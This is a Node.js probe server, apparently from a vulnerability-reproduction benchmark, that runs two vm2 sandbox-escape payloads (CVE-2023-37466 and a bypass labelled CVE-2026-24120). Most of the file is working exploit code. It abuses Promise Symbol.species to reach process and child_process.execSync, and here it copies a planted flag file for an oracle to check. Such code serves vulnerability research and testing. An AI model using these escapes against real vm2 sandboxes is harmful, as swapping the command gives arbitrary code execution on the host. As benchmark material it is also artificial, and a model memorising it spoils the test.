#!/usr/bin/env node
/**
 * PCB probe server for vm2-cve-2026-24120 (CVE-2023-37466 -> CVE-2026-24120).
 *
 * Runs attacker-controlled code inside the REAL vm2 sandbox:
 *   GET /health                        readiness
 *   GET /exploit?kind=37466            CVE-2023-37466 Promise species escape (seed)
 *   GET /exploit?kind=24120            CVE-2026-24120 resetPromiseSpecies bypass (residual)
 *
 * On sandbox escape the payload runs `cat /flag.txt > /tmp/pcb_result.txt`
 * (the flag is planted by the compose entrypoint from $PCB_FLAG). The oracle
 * reads /tmp/pcb_result.txt via docker exec (rce-oob).
 */
const http = require('http');
const fs = require('fs');
const { VM } = require('/app/node_modules/vm2');

process.on('unhandledRejection', () => {});
process.on('uncaughtException', () => {});

const CMD = "cat /flag.txt > /tmp/pcb_result.txt";

function payload37466() {
  return `
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('${CMD}'); }
            )
        }
    }
};
p.then();
`;
}

function payload24120() {
  return `
Object.defineProperty=()=>{};
async function fn() {
    const e = new Error();
    e.name = Symbol();
    return e.stack;
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('${CMD}'); }
            )
        }
    }
};
p.then();
`;
}

function serve(req, res) {
  const url = new URL(req.url, 'http://x');
  const respond = (code, obj) => {
    res.writeHead(code, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(obj));
  };
  if (url.pathname === '/health') return respond(200, { ok: true });

  if (url.pathname === '/exploit') {
    const kind = url.searchParams.get('kind');
    const code = kind === '37466' ? payload37466() : kind === '24120' ? payload24120() : null;
    if (!code) return respond(400, { error: 'kind' });
    fs.rmSync('/tmp/pcb_result.txt', { force: true });
    const vm = new VM();
    try {
      vm.run(code);
      respond(200, { ok: true, note: 'ran' });
    } catch (e) {
      respond(200, { ok: false, err: String(e.message).slice(0, 150) });
    }
    return;
  }
  respond(404, { error: 'not found' });
}

http.createServer(serve).listen(3000, '0.0.0.0', () => {
  console.log('pcb vm2 probe listening on 3000');
});
